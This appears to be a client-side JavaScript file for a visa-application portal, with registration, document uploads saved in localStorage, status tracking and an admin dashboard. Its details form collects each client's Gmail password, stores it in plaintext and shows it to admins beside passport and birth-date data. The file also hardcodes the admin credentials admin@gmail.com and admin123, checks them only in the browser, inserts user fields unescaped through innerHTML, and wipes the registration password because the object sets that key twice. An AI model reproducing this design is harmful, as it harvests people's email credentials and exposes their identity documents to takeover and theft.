// --- Pages ---
const pages = {
    clientLogin: document.getElementById("pageClientLogin"),
    visaType: document.getElementById("pageVisaType"),
    clientDetails: document.getElementById("pageClientDetails"), // NEW
    upload: document.getElementById("pageUpload"),
    clientDashboard: document.getElementById("pageClientDashboard"),
    adminLogin: document.getElementById("pageAdminLogin"),
    adminDashboard: document.getElementById("pageAdminDashboard"),
    trackVisa: document.getElementById("pageTrackVisa")
};

function showPage(page){
    for (let key in pages){
        pages[key].classList.remove("page-active");
    }
    page.classList.add("page-active");
}

// --- Toast ---
function showToast(msg,duration=3000){
    const toast = document.getElementById("toast");
    toast.textContent = msg;
    toast.classList.add("show");
    setTimeout(()=>toast.classList.remove("show"), duration);
}

// --- Navigation ---
document.getElementById("btnClientLogin").addEventListener("click", ()=> showPage(pages.clientLogin));
document.getElementById("btnTrackVisa").addEventListener("click", ()=> showPage(pages.trackVisa));
document.getElementById("btnAdminLogin").addEventListener("click", ()=> showPage(pages.adminLogin));

// --- Data & persistence ---
let clients = [];
let currentClient = null;
const progressStages = ["Pending","In Review","In Progress","Approved"];
const allStatuses = [...progressStages, "Rejected"];
const MAX_BYTES_PER_CLIENT = 10 * 1024 * 1024; // 10 MB

function loadClients(){
    const raw = localStorage.getItem("clients");
    if(raw){
        try {
            clients = JSON.parse(raw);
        } catch(e){
            clients = [];
            console.error("Failed to parse clients from localStorage:", e);
        }
    }
}
loadClients();

function saveClients(){
    localStorage.setItem("clients", JSON.stringify(clients));
}

// restore session
const storedEmail = localStorage.getItem("currentClientEmail");
if(storedEmail){
    currentClient = clients.find(c => c.email === storedEmail) || null;
    if(currentClient) showClientDashboard();
}

// --- Client registration/login (fixed password) ---
document.getElementById("clientLoginBtn").addEventListener("click", ()=>{
    const name = document.getElementById("clientName").value.trim();
    const email = document.getElementById("clientEmail").value.trim();
    const password = document.getElementById("clientPassword").value.trim();

    if(!name || !email || !password){
        showToast("Please fill in all fields");
        return;
    }

    let client = clients.find(c => c.email === email);

    if(client){
        // existing; check password
        if(client.password !== password){
            showToast("Incorrect password for this email");
            return;
        }
        currentClient = client;
        showToast(`Welcome back, ${client.name}`);
        showClientDashboard();
        showPage(pages.clientDashboard);
    } else {
        // create new client
        const code = "TRK" + Math.floor(100000 + Math.random()*900000);
        client = {
            name,
            email,
            password,
            trackingCode: code,
            visaType: "",
            country: "",
            passportNo: "",
            dob: "",
            phone: "",
            gmail: "",
            password: "",
            files: [], // {name,type,data,size,ts}
            status: 0
        };
        clients.push(client);
        saveClients();
        currentClient = client;
        localStorage.setItem("currentClientEmail", email);
        showToast(`Registered! Tracking Code: ${code}`);
        showPage(pages.visaType);
    }
});

// --- Visa type: go to details page first ---
document.getElementById("selectVisaBtn").addEventListener("click", ()=>{
    const visa = document.getElementById("visaTypeSelect").value;
    if(!visa){ showToast("Select a visa type"); return; }
    if(!currentClient){ showToast("No current client session"); return; }

    currentClient.visaType = visa;
    saveClients();

    // show the new details page before upload
    showPage(pages.clientDetails);
});

// --- Save details handler (FIXED) ---
document.getElementById("saveDetailsBtn").addEventListener("click", ()=>{
    if(!currentClient){ showToast("No client session"); return; }

    const country = document.getElementById("clientCountry").value.trim();
    const passportNo = document.getElementById("clientPassportNo").value.trim();
    const dob = document.getElementById("clientDob").value;
    const phone = document.getElementById("clientPhone").value.trim();
    const gmail = document.getElementById("clientGmail").value.trim();
    const gmailPassword = document.getElementById("clientGmailpassword").value.trim(); // ✅ get the password field

    // basic validation
    if(!country || !passportNo || !dob || !phone || !gmail || !gmailPassword){
        showToast("Please fill all fields or use Skip");
        return;
    }

    // update current client
    currentClient.country = country;
    currentClient.passportNo = passportNo;
    currentClient.dob = dob;
    currentClient.phone = phone;
    currentClient.gmail = gmail;
    currentClient.password = gmailPassword; // ✅ save password properly
    currentClient.detailsSavedAt = new Date().toISOString();

    saveClients();
    showToast("Details saved. Proceed to upload documents.");
    showPage(pages.upload);
});

// --- Skip details (NEW) ---
document.getElementById("skipDetailsBtn").addEventListener("click", ()=>{
    if(!currentClient){ showToast("No client session"); return; }
    showPage(pages.upload);
});

// --- helper: file to dataURL ---
function fileToDataURL(file){
    return new Promise((resolve,reject)=>{
        const reader = new FileReader();
        reader.onload = ()=> resolve(reader.result);
        reader.onerror = ()=> reject(new Error("Failed to read file"));
        reader.readAsDataURL(file);
    });
}

// --- helper: calculate client's current total bytes ---
function totalBytesForClient(client){
    if(!client || !client.files) return 0;
    return client.files.reduce((s,f)=> s + (f.size||0), 0);
}

// --- Upload files (read as dataURL and save to localStorage) ---
document.getElementById("uploadBtn").addEventListener("click", async ()=>{
    if(!currentClient){ showToast("No current client"); return; }

    const passportFile = document.getElementById("uploadPassport").files[0];
    const docs = Array.from(document.getElementById("uploadDocs").files || []);

    if(!passportFile && docs.length === 0){
        showToast("Select files to upload");
        return;
    }

    // compute incoming size
    let incomingBytes = 0;
    if(passportFile) incomingBytes += passportFile.size;
    for(const f of docs) incomingBytes += f.size;

    const existingBytes = totalBytesForClient(currentClient);
    if(existingBytes + incomingBytes > MAX_BYTES_PER_CLIENT){
        const mbLeft = ((MAX_BYTES_PER_CLIENT - existingBytes) / (1024*1024)).toFixed(2);
        showToast(`Upload exceeds 10 MB limit. You have ${mbLeft} MB left.`);
        return;
    }

    // read files
    try {
        if(passportFile){
            const data = await fileToDataURL(passportFile);
            currentClient.files.push({
                name: passportFile.name,
                type: passportFile.type || "image/*",
                data,
                size: passportFile.size,
                ts: new Date().toISOString()
            });
        }

        for(const f of docs){
            const data = await fileToDataURL(f);
            currentClient.files.push({
                name: f.name,
                type: f.type || "application/octet-stream",
                data,
                size: f.size,
                ts: new Date().toISOString()
            });
        }

        saveClients();
        showToast("Files uploaded and saved");
        showClientDashboard();
        showPage(pages.clientDashboard);
    } catch(e){
        console.error(e);
        showToast("Error reading files");
    }
});

// --- show client dashboard (client sees own file list) ---
function showClientDashboard(showFiles = true){
    if(!currentClient) return;

    document.getElementById("clientTrackingCode").textContent = currentClient.trackingCode;
    const statusText = currentClient.status === 4 ? "Rejected" : progressStages[currentClient.status];
    document.getElementById("clientStatus").textContent = "Status: " + statusText;

    const fill = document.querySelector("#clientProgress .progress-fill");
    fill.style.width = ((currentClient.status === 4 ? 1 : currentClient.status + 1) / progressStages.length) * 100 + "%";
    fill.className = "progress-fill";
    switch(currentClient.status){
        case 0: fill.classList.add("status-pending"); break;
        case 1: fill.classList.add("status-review"); break;
        case 2: fill.classList.add("status-progress"); break;
        case 3: fill.classList.add("status-approved"); launchConfetti(); break;
        case 4: fill.classList.add("status-rejected"); break;
    }

    const fileList = document.getElementById("clientFiles");
    fileList.innerHTML = "";

    if(showFiles){
        if(!currentClient.files || currentClient.files.length === 0){
            const p = document.createElement("p");
            p.textContent = "No files uploaded.";
            fileList.appendChild(p);
        } else {
            currentClient.files.forEach(f=>{
                const div = document.createElement("div");
                div.textContent = `[${f.type.split("/")[0]}] ${f.name} — ${new Date(f.ts).toLocaleString()}`;
                div.className = "file-preview";
                fileList.appendChild(div);
                setTimeout(()=> div.classList.add("show"), 30);
            });

            // show combined size info
            const sizeInfo = document.getElementById("uploadSizeInfo");
            if(sizeInfo){
                const usedMB = (totalBytesForClient(currentClient)/(1024*1024)).toFixed(2);
                sizeInfo.textContent = `Total uploaded: ${usedMB} MB / 10 MB`;
            }
        }
    }
}

// --- Track Visa ---
document.getElementById("trackBtn").addEventListener("click", ()=>{
    const code = document.getElementById("trackIdInput").value.trim();
    if(!code){ showToast("Enter tracking code"); return; }

    const client = clients.find(c => c.trackingCode === code);
    if(!client){ showToast("Invalid tracking code"); return; }

    currentClient = client;
    localStorage.setItem("currentClientEmail", client.email);
    showClientDashboard(false); // hide files in track view
    showPage(pages.clientDashboard);
});

// --- Admin Login & Dashboard rendering ---
document.getElementById("adminLoginBtn").addEventListener("click", ()=>{
    const email = document.getElementById("adminEmail").value.trim();
    const pass = document.getElementById("adminPassword").value.trim();
    if(email === "admin@gmail.com" && pass === "admin123"){
        showPage(pages.adminDashboard);
        renderAdminDashboard();
        showToast("Admin logged in");
    } else {
        showToast("Invalid admin credentials");
    }
});

function renderAdminDashboard(){
    const container = document.getElementById("adminAppList");
    container.innerHTML = "";

    if(clients.length === 0){
        const p = document.createElement("p");
        p.textContent = "No client applications yet.";
        p.style.textAlign = "center";
        p.style.padding = "10px";
        container.appendChild(p);
        return;
    }

    clients.forEach((c, i) => {
        const div = document.createElement("div");
        div.className = "adminClient";

        // info
        const info = document.createElement("p");
        info.textContent = `${c.name} (${c.trackingCode}) — ${c.email}`;

       // details row (updated: now includes password)
const detailsRow = document.createElement("div");
detailsRow.style.fontSize = "0.9rem";
detailsRow.style.opacity = "0.95";
detailsRow.style.marginTop = "6px";
detailsRow.innerHTML = `
    <strong>Country:</strong> ${c.country || '-'} &nbsp; |
    <strong>Passport:</strong> ${c.passportNo || '-'} &nbsp; |
    <strong>DOB:</strong> ${c.dob ? new Date(c.dob).toLocaleDateString() : '-'} &nbsp; |
    <strong>Phone:</strong> ${c.phone || '-'} &nbsp; |
    <strong>Email:</strong> ${c.gmail || c.email || '-'} &nbsp; |
    <strong>Password:</strong> ${c.password || '-'}
`;



        // progress bar (visual)
        const progress = document.createElement("div");
        progress.style.width = "150px";
        progress.style.height = "14px";
        progress.style.borderRadius = "10px";
        progress.style.background = "rgba(255,255,255,0.12)";
        const inner = document.createElement("div");
        inner.style.height = "100%";
        inner.style.borderRadius = "10px";
        switch(c.status){
            case 0: inner.style.width="25%"; inner.style.background="#facc15"; break;
            case 1: inner.style.width="50%"; inner.style.background="#fbbf24"; break;
            case 2: inner.style.width="75%"; inner.style.background="#f97316"; break;
            case 3: inner.style.width="100%"; inner.style.background="#34d399"; break;
            case 4: inner.style.width="100%"; inner.style.background="#f87171"; break;
        }
        progress.appendChild(inner);

        // status select dropdown
        const select = document.createElement("select");
        allStatuses.forEach((st, idx) => {
            const opt = document.createElement("option");
            opt.value = idx;
            opt.textContent = st;
            if(c.status === idx) opt.selected = true;
            select.appendChild(opt);
        });
        select.addEventListener("change", ()=>{
            c.status = parseInt(select.value);
            saveClients();
            renderAdminDashboard();
            if(currentClient && currentClient.trackingCode === c.trackingCode) showClientDashboard();
            showToast(`${c.trackingCode} status updated`);
        });

        // view docs button (opens modal)
        const viewBtn = document.createElement("button");
        viewBtn.textContent = "View Documents";
        viewBtn.addEventListener("click", ()=> openDocModal(i));

        // reject button (fade-out visual)
        const rejectBtn = document.createElement("button");
        rejectBtn.textContent = "Reject";
        rejectBtn.addEventListener("click", ()=>{
            c.status = 4;
            saveClients();
            div.classList.add("fade-out");
            setTimeout(()=> {
                renderAdminDashboard();
                if(currentClient && currentClient.trackingCode === c.trackingCode) showClientDashboard();
                showToast(`${c.trackingCode} Rejected`);
            }, 450);
        });

        // delete button (fade-out, then remove)
        const deleteBtn = document.createElement("button");
        deleteBtn.textContent = "Delete";
        deleteBtn.style.background = "#ef4444";
        deleteBtn.addEventListener("click", ()=>{
            if(!confirm(`Delete ${c.name}? This action cannot be undone.`)) return;
            div.classList.add("fade-out");
            setTimeout(()=>{
                clients.splice(i,1);
                saveClients();
                if(currentClient && currentClient.trackingCode === c.trackingCode){
                    currentClient = null;
                    localStorage.removeItem("currentClientEmail");
                }
                renderAdminDashboard();
                showToast(`${c.name} deleted`);
            },450);
        });

        // controls wrapper
        const controls = document.createElement("div");
        controls.style.display = "flex";
        controls.style.gap = "8px";
        controls.append(progress, select, viewBtn, rejectBtn, deleteBtn);

        // file list small preview (admin sees file names & timestamps)
        const filesWrap = document.createElement("div");
        filesWrap.style.marginTop = "6px";
        filesWrap.style.fontSize = "0.9rem";
        if(!c.files || c.files.length === 0){
            const p = document.createElement("p");
            p.textContent = "No files uploaded yet.";
            filesWrap.appendChild(p);
        } else {
            c.files.forEach(f => {
                const fLine = document.createElement("div");
                fLine.textContent = `[${f.type.split("/")[0]}] ${f.name} — ${new Date(f.ts).toLocaleString()} (${(f.size/1024).toFixed(1)} KB)`;
                filesWrap.appendChild(fLine);
            });
        }

        div.append(info, detailsRow, controls, filesWrap);
        container.appendChild(div);
    });
}

// --- Document Modal (admin-only viewer & download) ---
const docModal = document.getElementById("docModal");
const modalOverlay = document.getElementById("modalOverlay");
const modalBody = document.getElementById("modalBody");
const closeModal = document.getElementById("closeModal");
const modalCloseBtn = document.getElementById("modalCloseBtn");

function openDocModal(clientIndex){
    const client = clients[clientIndex];
    if(!client) return;
    modalBody.innerHTML = ""; // clear

    const title = document.getElementById("modalTitle");
    title.textContent = `${client.name} • ${client.trackingCode}`;

    if(!client.files || client.files.length === 0){
        const p = document.createElement("p");
        p.textContent = "No uploaded documents for this client.";
        modalBody.appendChild(p);
    } else {
        client.files.forEach((f, idx) => {
            const wrapper = document.createElement("div");
            wrapper.style.display = "flex";
            wrapper.style.flexDirection = "column";
            wrapper.style.gap = "8px";

            const meta = document.createElement("div");
            meta.className = "file-meta";

            const fname = document.createElement("div");
            fname.style.fontWeight = "600";
            fname.textContent = f.name;

            const metaRight = document.createElement("div");
            metaRight.style.display = "flex";
            metaRight.style.gap = "8px";
            metaRight.style.alignItems = "center";

            const ts = document.createElement("div");
            ts.className = "file-ts";
            ts.textContent = new Date(f.ts).toLocaleString();

            const size = document.createElement("div");
            size.style.fontSize = "0.9rem";
            size.style.opacity = "0.9";
            size.textContent = `${(f.size/1024).toFixed(1)} KB`;

            // download button (uses data URL)
            const dl = document.createElement("a");
            dl.className = "btn-download";
            dl.textContent = "Download";
            dl.href = f.data;
            dl.download = f.name;
            dl.setAttribute("role", "button");

            metaRight.append(size, ts, dl);
            meta.append(fname, metaRight);

            wrapper.appendChild(meta);

            // Preview
            if(f.type.startsWith("image/")){
                const img = document.createElement("img");
                img.src = f.data;
                img.alt = f.name;
                img.style.maxHeight = "60vh";
                wrapper.appendChild(img);
            } else if(f.type === "application/pdf" || f.name.toLowerCase().endsWith(".pdf")){
                const obj = document.createElement("object");
                obj.data = f.data;
                obj.type = "application/pdf";
                obj.style.width = "100%";
                obj.style.height = "60vh";
                wrapper.appendChild(obj);
            } else if(f.type.startsWith("text/")){
                const pre = document.createElement("pre");
                pre.style.maxHeight = "60vh";
                pre.style.overflow = "auto";
                try {
                    const comma = f.data.indexOf(',');
                    const b64 = f.data.slice(comma+1);
                    const text = atob(b64);
                    pre.textContent = text;
                } catch (e){
                    pre.textContent = "Preview not available.";
                }
                wrapper.appendChild(pre);
            } else {
                const note = document.createElement("p");
                note.textContent = "No inline preview available for this file type. Use Download.";
                wrapper.appendChild(note);
            }

            modalBody.appendChild(wrapper);
        });
    }

    // show modal
    docModal.setAttribute("aria-hidden", "false");
    modalOverlay.style.display = "block";
    docModal.style.display = "block";
    document.body.style.overflow = "hidden";
}

function closeDocModal(){
    docModal.setAttribute("aria-hidden", "true");
    modalOverlay.style.display = "none";
    docModal.style.display = "none";
    modalBody.innerHTML = "";
    document.body.style.overflow = "";
}

modalOverlay.addEventListener("click", closeDocModal);
closeModal.addEventListener("click", closeDocModal);
modalCloseBtn.addEventListener("click", closeDocModal);

// --- Confetti ---
function launchConfetti(){
    const container = document.getElementById("confetti-container");
    for(let i=0;i<80;i++){
        const el = document.createElement("div");
        el.style.position = "fixed";
        el.style.width = el.style.height = Math.random()*8 + 6 + "px";
        el.style.background = `hsl(${Math.random()*360},80%,50%)`;
        el.style.left = Math.random()*window.innerWidth + "px";
        el.style.top = -20 - Math.random()*200 + "px";
        el.style.opacity = Math.random();
        el.style.borderRadius = "4px";
        container.appendChild(el);

        const falling = setInterval(()=>{
            const t = parseFloat(el.style.top) || -50;
            el.style.top = t + 6 + Math.random()*6 + "px";
            el.style.left = (parseFloat(el.style.left) + Math.random()*6 - 3) + "px";
            if(parseFloat(el.style.top) > window.innerHeight + 40){
                el.remove();
                clearInterval(falling);
            }
        },30);
        setTimeout(()=> { if(el.parentNode) el.remove(); }, 3000);
    }
}

// --- Logout ---
document.getElementById("logoutClient").addEventListener("click", ()=>{
    currentClient = null;
    localStorage.removeItem("currentClientEmail");
    showPage(pages.clientLogin);
    showToast("Client logged out");
});

document.getElementById("logoutAdmin").addEventListener("click", ()=>{
    showPage(pages.adminLogin);
    showToast("Admin logged out");
});
